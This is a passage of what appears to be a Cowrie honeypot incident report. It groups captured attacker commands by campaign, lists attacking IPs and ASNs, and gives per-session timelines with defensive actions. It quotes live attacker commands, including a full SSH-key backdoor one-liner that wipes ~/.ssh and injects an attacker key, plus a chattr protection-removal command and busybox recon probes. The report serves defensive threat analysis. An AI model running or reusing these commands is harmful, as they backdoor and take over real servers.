export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `45.74.3.137`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `5.175.136.100`, `69.49.246.176`, `103.200.22.154`, `123.1.147.204`, `115.190.64.245`, `134.209.116.251`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **280** |
| Unique ASNs | **140** |
| High-Risk ASNs | **129** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 17 | HIGH |
| `AS46562` | Performive LLC | 16 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 12 | HIGH |
| `AS63949` | Akamai Connected Cloud | 10 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 8 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 8 | HIGH |
| `AS4766` | Korea Telecom | 8 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (260)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cf4b091843d0

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]109` |
| **First Seen** | 2026-08-01 04:57 |
| **Last Seen** | 2026-08-01 04:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 04:57:06` | `cowrie.session.connect` |
| `2026-08-01 04:57:07` | `cowrie.client.version` |
| `2026-08-01 04:57:07` | `cowrie.client.kex` |
| `2026-08-01 04:57:09` | `cowrie.login.success` |
| `2026-08-01 04:57:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 04:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]109` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57a7fade2db

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-08-01 04:57 |
| **Last Seen** | 2026-08-01 04:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 04:57:15` | `cowrie.session.connect` |
| `2026-08-01 04:57:16` | `cowrie.client.version` |
| `2026-08-01 04:57:16` | `cowrie.client.kex` |
| `2026-08-01 04:57:18` | `cowrie.login.success` |
| `2026-08-01 04:57:18` | `cowrie.direct-tcpip.request` |
| `2026-08-01 04:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ecc6e72a8a1

| Field | Detail |
|---|---|
| **Source IP** | `123.1.147[.]204` |
| **First Seen** | 2026-08-01 05:02 |
| **Last Seen** | 2026-08-01 05:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:02:30` | `cowrie.session.connect` |
| `2026-08-01 05:02:30` | `cowrie.client.version` |
| `2026-08-01 05:02:30` | `cowrie.client.kex` |
| `2026-08-01 05:02:31` | `cowrie.login.success` |
| `2026-08-01 05:02:32` | `cowrie.session.params` |
| `2026-08-01 05:02:32` | `cowrie.command.input` |
| `2026-08-01 05:02:32` | `cowrie.command.failed` |
| `2026-08-01 05:02:32` | `cowrie.log.closed` |
| `2026-08-01 05:02:33` | `cowrie.session.params` |
| `2026-08-01 05:02:33` | `cowrie.command.input` |
| `2026-08-01 05:02:34` | `cowrie.session.file_download` |
| `2026-08-01 05:02:34` | `cowrie.log.closed` |
| `2026-08-01 05:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.1.147[.]204` to AbuseIPDB if not already reported
- [ ] Block `123.1.147[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a0bd6775d5f

| Field | Detail |
|---|---|
| **Source IP** | `123.1.147[.]204` |
| **First Seen** | 2026-08-01 05:02 |
| **Last Seen** | 2026-08-01 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:02:34` | `cowrie.session.connect` |
| `2026-08-01 05:02:34` | `cowrie.client.version` |
| `2026-08-01 05:02:34` | `cowrie.client.kex` |
| `2026-08-01 05:02:35` | `cowrie.login.success` |
| `2026-08-01 05:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.1.147[.]204` to AbuseIPDB if not already reported
- [ ] Block `123.1.147[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6819f8ae82f9

| Field | Detail |
|---|---|
| **Source IP** | `123.1.147[.]204` |
| **First Seen** | 2026-08-01 05:02 |
| **Last Seen** | 2026-08-01 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:02:35` | `cowrie.session.connect` |
| `2026-08-01 05:02:35` | `cowrie.client.version` |
| `2026-08-01 05:02:35` | `cowrie.client.kex` |
| `2026-08-01 05:02:36` | `cowrie.login.success` |
| `2026-08-01 05:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.1.147[.]204` to AbuseIPDB if not already reported
- [ ] Block `123.1.147[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca69d26c945

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-08-01 05:04 |
| **Last Seen** | 2026-08-01 05:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:04:21` | `cowrie.session.connect` |
| `2026-08-01 05:04:22` | `cowrie.client.version` |
| `2026-08-01 05:04:22` | `cowrie.client.kex` |
| `2026-08-01 05:04:24` | `cowrie.login.success` |
| `2026-08-01 05:04:24` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ade4c39ed24

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-08-01 05:04 |
| **Last Seen** | 2026-08-01 05:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:04:30` | `cowrie.session.connect` |
| `2026-08-01 05:04:30` | `cowrie.client.version` |
| `2026-08-01 05:04:30` | `cowrie.client.kex` |
| `2026-08-01 05:04:31` | `cowrie.login.success` |
| `2026-08-01 05:04:32` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dab4e63d7bd6

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-08-01 05:04 |
| **Last Seen** | 2026-08-01 05:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:04:34` | `cowrie.session.connect` |
| `2026-08-01 05:04:35` | `cowrie.client.version` |
| `2026-08-01 05:04:35` | `cowrie.client.kex` |
| `2026-08-01 05:04:38` | `cowrie.login.success` |
| `2026-08-01 05:04:39` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e6d9428268

| Field | Detail |
|---|---|
| **Source IP** | `117.252.93[.]114` |
| **First Seen** | 2026-08-01 05:04 |
| **Last Seen** | 2026-08-01 05:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:04:37` | `cowrie.session.connect` |
| `2026-08-01 05:04:37` | `cowrie.client.version` |
| `2026-08-01 05:04:37` | `cowrie.client.kex` |
| `2026-08-01 05:04:40` | `cowrie.login.success` |
| `2026-08-01 05:04:40` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.252.93[.]114` to AbuseIPDB if not already reported
- [ ] Block `117.252.93[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3686b99ad910

| Field | Detail |
|---|---|
| **Source IP** | `190.188.60[.]235` |
| **First Seen** | 2026-08-01 05:07 |
| **Last Seen** | 2026-08-01 05:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, echo C2PROBE_OK` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:07:27` | `cowrie.session.connect` |
| `2026-08-01 05:07:27` | `cowrie.telnet.option` |
| `2026-08-01 05:07:27` | `cowrie.login.success` |
| `2026-08-01 05:07:28` | `cowrie.session.params` |
| `2026-08-01 05:07:28` | `cowrie.telnet.option` |
| `2026-08-01 05:07:28` | `cowrie.telnet.option` |
| `2026-08-01 05:07:28` | `cowrie.command.input` |
| `2026-08-01 05:07:28` | `cowrie.command.failed` |
| `2026-08-01 05:07:28` | `cowrie.command.input` |
| `2026-08-01 05:07:28` | `cowrie.command.failed` |
| `2026-08-01 05:07:28` | `cowrie.command.input` |
| `2026-08-01 05:07:28` | `cowrie.command.failed` |
| `2026-08-01 05:07:29` | `cowrie.command.input` |
| `2026-08-01 05:07:29` | `cowrie.command.input` |
| `2026-08-01 05:07:29` | `cowrie.command.input` |
| `2026-08-01 05:07:29` | `cowrie.command.input` |
| `2026-08-01 05:07:29` | `cowrie.log.closed` |
| `2026-08-01 05:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.188.60[.]235` to AbuseIPDB if not already reported
- [ ] Block `190.188.60[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d97015a6897

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 05:08 |
| **Last Seen** | 2026-08-01 05:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:08:23` | `cowrie.session.connect` |
| `2026-08-01 05:08:23` | `cowrie.client.version` |
| `2026-08-01 05:08:23` | `cowrie.client.kex` |
| `2026-08-01 05:08:24` | `cowrie.login.success` |
| `2026-08-01 05:08:24` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:08:24` | `cowrie.direct-tcpip.data` |
| `2026-08-01 05:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6f4ac884977

| Field | Detail |
|---|---|
| **Source IP** | `190.188.60[.]235` |
| **First Seen** | 2026-08-01 05:09 |
| **Last Seen** | 2026-08-01 05:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, echo C2PROBE_OK` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:09:03` | `cowrie.session.connect` |
| `2026-08-01 05:09:04` | `cowrie.telnet.option` |
| `2026-08-01 05:09:04` | `cowrie.login.success` |
| `2026-08-01 05:09:04` | `cowrie.session.params` |
| `2026-08-01 05:09:04` | `cowrie.telnet.option` |
| `2026-08-01 05:09:04` | `cowrie.telnet.option` |
| `2026-08-01 05:09:04` | `cowrie.command.input` |
| `2026-08-01 05:09:04` | `cowrie.command.failed` |
| `2026-08-01 05:09:05` | `cowrie.command.input` |
| `2026-08-01 05:09:05` | `cowrie.command.failed` |
| `2026-08-01 05:09:05` | `cowrie.command.input` |
| `2026-08-01 05:09:05` | `cowrie.command.failed` |
| `2026-08-01 05:09:05` | `cowrie.command.input` |
| `2026-08-01 05:09:05` | `cowrie.command.input` |
| `2026-08-01 05:09:05` | `cowrie.command.input` |
| `2026-08-01 05:09:05` | `cowrie.command.input` |
| `2026-08-01 05:09:05` | `cowrie.log.closed` |
| `2026-08-01 05:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.188.60[.]235` to AbuseIPDB if not already reported
- [ ] Block `190.188.60[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6152bc58952

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-08-01 05:09 |
| **Last Seen** | 2026-08-01 05:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:09:59` | `cowrie.session.connect` |
| `2026-08-01 05:09:59` | `cowrie.client.version` |
| `2026-08-01 05:09:59` | `cowrie.client.kex` |
| `2026-08-01 05:10:02` | `cowrie.login.success` |
| `2026-08-01 05:10:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2544c6632d

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-01 05:13 |
| **Last Seen** | 2026-08-01 05:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:13:03` | `cowrie.session.connect` |
| `2026-08-01 05:13:04` | `cowrie.client.version` |
| `2026-08-01 05:13:04` | `cowrie.client.kex` |
| `2026-08-01 05:13:06` | `cowrie.login.success` |
| `2026-08-01 05:13:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f28e76f3d9

| Field | Detail |
|---|---|
| **Source IP** | `203.193.147[.]75` |
| **First Seen** | 2026-08-01 05:13 |
| **Last Seen** | 2026-08-01 05:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:13:27` | `cowrie.session.connect` |
| `2026-08-01 05:13:28` | `cowrie.client.version` |
| `2026-08-01 05:13:28` | `cowrie.client.kex` |
| `2026-08-01 05:13:30` | `cowrie.login.success` |
| `2026-08-01 05:13:31` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.193.147[.]75` to AbuseIPDB if not already reported
- [ ] Block `203.193.147[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26164d0702c9

| Field | Detail |
|---|---|
| **Source IP** | `113.219.177[.]95` |
| **First Seen** | 2026-08-01 05:14 |
| **Last Seen** | 2026-08-01 05:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:14:04` | `cowrie.session.connect` |
| `2026-08-01 05:14:05` | `cowrie.client.version` |
| `2026-08-01 05:14:05` | `cowrie.client.kex` |
| `2026-08-01 05:14:09` | `cowrie.login.success` |
| `2026-08-01 05:14:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.219.177[.]95` to AbuseIPDB if not already reported
- [ ] Block `113.219.177[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50bde4b7fef3

| Field | Detail |
|---|---|
| **Source IP** | `218.200.9[.]182` |
| **First Seen** | 2026-08-01 05:14 |
| **Last Seen** | 2026-08-01 05:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:14:17` | `cowrie.session.connect` |
| `2026-08-01 05:14:18` | `cowrie.client.version` |
| `2026-08-01 05:14:18` | `cowrie.client.kex` |
| `2026-08-01 05:14:20` | `cowrie.login.success` |
| `2026-08-01 05:14:21` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.200.9[.]182` to AbuseIPDB if not already reported
- [ ] Block `218.200.9[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71f653e97df9

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-08-01 05:14 |
| **Last Seen** | 2026-08-01 05:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:14:41` | `cowrie.session.connect` |
| `2026-08-01 05:14:41` | `cowrie.client.version` |
| `2026-08-01 05:14:41` | `cowrie.client.kex` |
| `2026-08-01 05:14:42` | `cowrie.login.success` |
| `2026-08-01 05:14:42` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd7006ba25d4

| Field | Detail |
|---|---|
| **Source IP** | `125.35.109[.]214` |
| **First Seen** | 2026-08-01 05:14 |
| **Last Seen** | 2026-08-01 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:14:52` | `cowrie.session.connect` |
| `2026-08-01 05:14:53` | `cowrie.client.version` |
| `2026-08-01 05:14:53` | `cowrie.client.kex` |
| `2026-08-01 05:14:55` | `cowrie.login.success` |
| `2026-08-01 05:14:55` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.35.109[.]214` to AbuseIPDB if not already reported
- [ ] Block `125.35.109[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdaac0e05a50

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-01 05:14 |
| **Last Seen** | 2026-08-01 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:14:57` | `cowrie.session.connect` |
| `2026-08-01 05:14:58` | `cowrie.client.version` |
| `2026-08-01 05:14:58` | `cowrie.client.kex` |
| `2026-08-01 05:15:00` | `cowrie.login.success` |
| `2026-08-01 05:15:01` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39328bff23a3

| Field | Detail |
|---|---|
| **Source IP** | `150.5.169[.]176` |
| **First Seen** | 2026-08-01 05:15 |
| **Last Seen** | 2026-08-01 05:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
